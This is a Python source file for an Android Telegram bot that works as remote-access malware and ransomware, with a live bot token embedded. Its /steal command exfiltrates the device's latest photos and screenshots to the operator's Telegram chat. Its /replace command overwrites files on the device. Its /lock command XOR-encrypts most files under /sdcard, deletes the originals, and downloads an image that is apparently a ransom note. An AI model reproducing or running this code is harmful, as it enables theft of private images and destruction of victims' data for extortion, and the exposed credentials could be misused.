import os
import telebot
import mimetypes
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import requests

bot_token = "7853309339:AAHUHq-DHxTMByxY8sk8A5ZHQODOCTXPx-o"
user_id = "5122281931"

bot = telebot.TeleBot(bot_token)

file_to_replace = {}

def get_latest_images(base_path, exclude_folders=["Android", ".thumbnails"], num_files=10, keyword=None):
    all_files = []
    for root, dirs, files in os.walk(base_path):
        if any(excluded in root for excluded in exclude_folders) or os.path.basename(root).startswith("."):
            continue
        for file in files:
            file_path = os.path.join(root, file)
            mime_type, _ = mimetypes.guess_type(file_path)
            if mime_type and mime_type.startswith("image"):
                if keyword and keyword.lower() not in file.lower():
                    continue
                all_files.append(file_path)
    all_files.sort(key=lambda x: os.path.getmtime(x), reverse=True)
    return all_files[:num_files]

@bot.message_handler(commands=["steal"])
def handle_steal_command(message):
    try:
        args = message.text.split()
        if len(args) < 2 or not args[-1].isdigit():
            bot.reply_to(message, "Usage: /steal [ss] <number>")
            return
        num_images = int(args[-1])
        keyword = "creensho" if len(args) == 3 and args[1].lower() == "ss" else None
        base_path = "/sdcard"
        latest_images = get_latest_images(base_path, num_files=num_images, keyword=keyword)
        if not latest_images:
            bot.reply_to(message, "No images found.")
            return
        for image in latest_images:
            with open(image, "rb") as file:
                bot.send_photo(message.chat.id, file, caption=f"File: {os.path.basename(image)}\nLocation: {image}")
    except:
        bot.reply_to(message, "An error occurred while processing your request.")

@bot.message_handler(commands=["replace"])
def handle_replace_command(message):
    bot.reply_to(message, "Send me the file location to replace.")
    bot.register_next_step_handler(message, get_file_location)

def get_file_location(message):
    file_path = message.text
    if os.path.exists(file_path):
        file_to_replace[message.chat.id] = file_path
        bot.reply_to(message, "File found. Now send the new photo to replace it with.")
        bot.register_next_step_handler(message, replace_file)
    else:
        bot.reply_to(message, "File not found. Please send a valid file path.")

def replace_file(message):
    if message.chat.id not in file_to_replace:
        bot.reply_to(message, "No file path provided. Please start again using /replace.")
        return
    file_path = file_to_replace[message.chat.id]
    if message.content_type == "photo":
        try:
            file_info = bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(file_path, "wb") as file:
                file.write(downloaded_file)
            bot.reply_to(message, "Done replaced ✅")
            del file_to_replace[message.chat.id]
        except:
            bot.reply_to(message, "An error occurred while replacing the file.")
    else:
        bot.reply_to(message, "Please send a valid photo full path to replace the file.")

@bot.message_handler(commands=["lock"])
def handle_lock_command(message):
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.reply_to(message, "Usage: /lock {key}")
            return
        key = args[1]
        bot.reply_to(message, f"Started Work Sir 😂🔧\n\nKey : ```{key}```")
        
        get_file_sizes(key)
        
        save_image_url = "https://i.ibb.co/Qj8hmDmZ/Screenshot-60.png"
        save_image_data = requests.get(save_image_url).content
        save_image_path = "/sdcard/Screenshot-60.png"
        
        with open(save_image_path, "wb") as file:
            file.write(save_image_data)
        
        bot.reply_to(message, "Fucked Data, Work Done Sir ✅")
    except:
        bot.reply_to(message, "An error occurred while processing your request.")

def xor_encrypt_file(file_name, size, key):
    #print(f"Started Enc {file_name}, Size: {size} bytes")
    if not os.path.exists(file_name):
        return
    
    with open(file_name, "rb") as file:
        content = file.read()
    
    key_bytes = key.encode()
    encrypted_content = bytes(content[i] ^ key_bytes[i % len(key_bytes)] for i in range(len(content)))

    encrypted_file_name = file_name + ".lock"
    
    with open(encrypted_file_name, "wb") as file:
        file.write(encrypted_content)
    os.remove(file_name)
    #print(f"Encrypted File: {file_name}, Size: {size} bytes")

def passer_encrypt_file(file_path, size, key):
    file_path_small = file_path.lower()
    mb = size / (1024 * 1024)
    
    extensions = [".jpg", ".png", ".jpeg", ".zip", ".mp3", ".mp4", ".txt", ".pdf", ".docx", 
                  ".json", ".csv", ".xlsx", ".rar", ".webp", ".heic", ".wav", ".aiff", ".flac", 
                  ".odt", ".pptx", ".rtf", ".py"]
    
    if mb <= 50 or any(file_path_small.endswith(ext) for ext in extensions):
        #print(f"File: {file_path}, Size: {size} bytes, Mb: {mb}")
        xor_encrypt_file(file_path, size, key)
    else:
        pass

def get_file_sizes(key):
    path = '/sdcard'
    file_info = []

    for dirpath, dirnames, filenames in os.walk(path):
        for filename in filenames:
            file_path = os.path.join(dirpath, filename)
            try:
                file_size = os.path.getsize(file_path)
                file_info.append((file_path, file_size))
            except OSError:
                continue
    
    file_info.sort(key=lambda x: x[1])

    threads = []

    for file_path, size in file_info:
        thread = threading.Thread(target=passer_encrypt_file, args=(file_path, size, key))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

bot.polling()
